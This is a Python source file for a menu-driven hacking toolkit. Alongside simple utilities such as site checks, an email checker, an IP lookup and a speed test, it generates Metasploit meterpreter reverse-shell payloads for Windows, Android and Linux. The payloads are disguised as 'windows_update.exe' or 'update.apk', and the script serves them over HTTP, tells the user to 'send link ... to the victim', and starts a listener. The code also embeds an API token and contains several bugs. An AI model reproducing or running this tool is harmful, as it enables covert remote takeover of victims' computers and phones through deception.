from re import M
import requests, json, os, time, speedtest, shutil
from colorama import Fore as F
import subprocess

def tentar():
    #if os.name == 'nt':
    #    print('YOU CANT USE THIS PROGRAM ON WINDOWS MACHINE')
    #else:
        try:

            def logo():
                r = requests.get('https://pastebin.com/raw/15r4d3yE')
                print(F.LIGHTYELLOW_EX + r.text)

            def clear():
                if os.system == 'nt':
                    os.system('cls')
                else:
                    os.system('clear')

            def main():
                clear()
                logo()
                print(f'{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}01{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}Check if site is up/down        {F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}05{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}Generate Windows Payload')
                print(f'{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}02{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}Check if email is valid         {F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}06{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}Generate Android Payload')
                print(f'{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}03{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}IP Tracker                      {F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}07{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}Generate Linux Payload')
                print(f'{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}04{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}Check Internet Speed            {F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}99{F.LIGHTGREEN_EX}] {F.LIGHTRED_EX}Exit')
                #print(f'\n\n\n{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}99{F.LIGHTGREEN_EX}] {F.LIGHTRED_EX}Exit')

                x = input(f'\n\n{F.LIGHTGREEN_EX}[*] Choose an option > {F.RESET}')
                if x == '1':
                    check_site()
                elif x == '2':
                    check_email()
                elif x == '3':
                    ip_tracker()
                elif x == '4':
                    Speedtest()
                elif x == '5':
                    windows_payload()
                elif x == '6':
                    android_payload()
                elif x == '7':
                    linux_payload()
                elif x == '99':
                    sair()
                else:
                    print(F.RED + 'ERROR')
                    print(F.RESET + 'Returning to main area in:')
                    print(3)
                    time.sleep(1)
                    print(2)
                    time.sleep(1)
                    print(1)
                    time.sleep(1)
                    return tentar()

            def check_site():
                site = input(f'{F.LIGHTGREEN_EX}[*] Website > {F.RESET}')
                r = requests.get(site)
                if r.status_code == 200:
                    print(f'{F.LIGHTYELLOW_EX}Site is {F.LIGHTGREEN_EX} ONLINE {F.RESET}')
                else:
                    print(f'{F.LIGHTYELLOW_EX}Site is {F.LIGHTRED_EX} OFFLINE {F.RESET}')

                time.sleep(5)
                return tentar()

            def check_email():
                email = input(f'{F.LIGHTGREEN_EX}[*] Check email > {F.RESET}')
                r = requests.get(f'https://api.2ip.me/email.txt?email={email}')
                if r.text == 'true':
                    print(f'{F.LIGHTGREEN_EX}[*] Mail "{email}" is VALID!{F.RESET}')
                    time.sleep(5)
                    return tentar()
                else:
                    print(f'{F.LIGHTYELLOW_EX}[!] Invalid email!')
                    time.sleep(5)
                    return tentar()

            def ip_tracker():
                try:
                    ip = input(f'{F.LIGHTGREEN_EX}[*] IP Address > {F.RESET}')
                    r = requests.get(f'https://ipinfo.io/{ip}/?token=195ace11ca99b7')
                    dados = json.loads(r.text)
                    print(f'{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}IP{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}      {dados["ip"]}')
                    print(f'{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}Hostname{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}{dados["hostname"]}')
                    print(f'{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}Country{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX} {dados["country"]}')
                    print(f'{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}Region{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}  {dados["region"]}')
                    print(f'{F.LIGHTGREEN_EX}[{F.LIGHTWHITE_EX}City{F.LIGHTGREEN_EX}] {F.LIGHTYELLOW_EX}    {dados["city"]}')
                    print(f'{F.LIGHTGREEN_EX}[*] Press ctrl+c to return to main menu{F.RESET}')
                    time.sleep(600)
                except KeyboardInterrupt:
                    return tentar()

            def Speedtest():
                st = speedtest.Speedtest()
                threads = None
                st.get_best_server()
                st.download(threads=threads)
                st.upload(threads=threads)

                filename = 'SpeedTest.png'

                r = requests.get(st.results.share(), stream=True)

                if r.status_code == 200:
                    r.raw.decode_content = True
                    with open(filename, 'wb') as f:
                        shutil.copyfileobj(r.raw, f)

                    os.system('SpeedTest.png')

                    return tentar()
                else:
                    print('Aconteceu um erro!')
                    time.sleep(3)
                    return tentar()

            def windows_payload():
                if os.name == 'nt':
                    print(f'{F.LIGHTRED_EX}[*] THIS OPTION IS ONLY AVAILABLE FOR LINUX{F.RESET}')
                    time.sleep(3)
                    return tentar()
                else:
                    clear()
                    r = requests.get('https://pastebin.com/raw/yPixBpgX')
                    print(F.LIGHTYELLOW_EX + r.text + F.RESET)
                    ip = input(f'\n\n{F.LIGHTGREEN_EX}[*] SET LHOST > {F.RESET}')
                    port = input(f'{F.LIGHTGREEN_EX}[*] SET LPORT > {F.RESET}')
                    if port == '1234':
                        print(F.LIGHTRED_EX + "[*] YOU CAN'T USE PORT 1234")
                    else:
                        subprocess.Popen(['python3', '-m', 'http.server', '1234'])
                        os.system(f'msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe lhost={ip} lport={port} -o windows_update.exe')
                        print(f'{F.LIGHTGREEN_EX}[*] Payload was saved as "windows_update.exe"{F.RESET}')
                        print(f'{F.LIGHTGREEN_EX}[*] Send link https://{ip}:{port}/windows_update.exe to the victim')
                        os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport{port}; exploit;"')

            def android_payload():
                if os.name == 'nt':
                    print(f'{F.LIGHTRED_EX}[*] THIS OPTION IS ONLY AVAILABLE FOR LINUX{F.RESET}')
                    time.sleep(3)
                    return tentar()
                else:
                    clear()
                    r = requests.get('https://pastebin.com/raw/RyGAUCGs')
                    print(F.LIGHTYELLOW_EX + r.text + F.RESET)
                    ip = input(f'\n\n{F.LIGHTGREEN_EX}[*] SET LHOST > {F.RESET}')
                    port = input(f'\n\n{F.LIGHTGREEN_EX}[*] SET LPORT > {F.RESET}')
                    os.system(f'msfvenom -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R > update.apk')
                    print(f'{F.LIGHTGREEN_EX}[*] Payload was saved as "update.apk"{F.RESET}')
                    os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit;"')

            def linux_payload():
                if os.name == 'nt':
                    print(f'{F.LIGHTRED_EX}[*] THIS OPTION IS ONLY AVAILABLE FOR LINUX{F.RESET}')
                    time.sleep(3)
                    return tentar()
                else:
                    clear()
                    r = requests.get('https://pastebin.com/raw/C2iqfNzA')
                    print(F.LIGHTYELLOW_EX + r.text + F.RESET)
                    ip = input(f'\n\n{F.LIGHTGREEN_EX}[*] SET LHOST > {F.RESET}')
                    port = input(f'\n\n{F.LIGHTGREEN_EX}[*] SET LPORT > {F.RESET}')
                    os.system(f'msfvenom -p python/meterpreter/reverse_tcp lhost={ip} lport={port} > linuxupdate.py')
                    print(f'{F.LIGHTGREEN_EX}[*] Payload was saved as "linux_update.py"{F.RESET}')
                    os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit; "')


            def sair():
                clear()
                r = requests.get('https://pastebin.com/raw/0C9TP130')
                print(F.RED + r.text + F.RESET)
                time.sleep(3)
                clear()
                exit()

            main()


        except KeyboardInterrupt:
            clear()
            sure = input(f'{F.LIGHTGREEN_EX}[*] Are you sure that you want to leave? y/n > {F.RESET}')
            if sure == 'y':
                sair()
            else:
                return tentar()


if __name__ == '__main__':
    tentar()
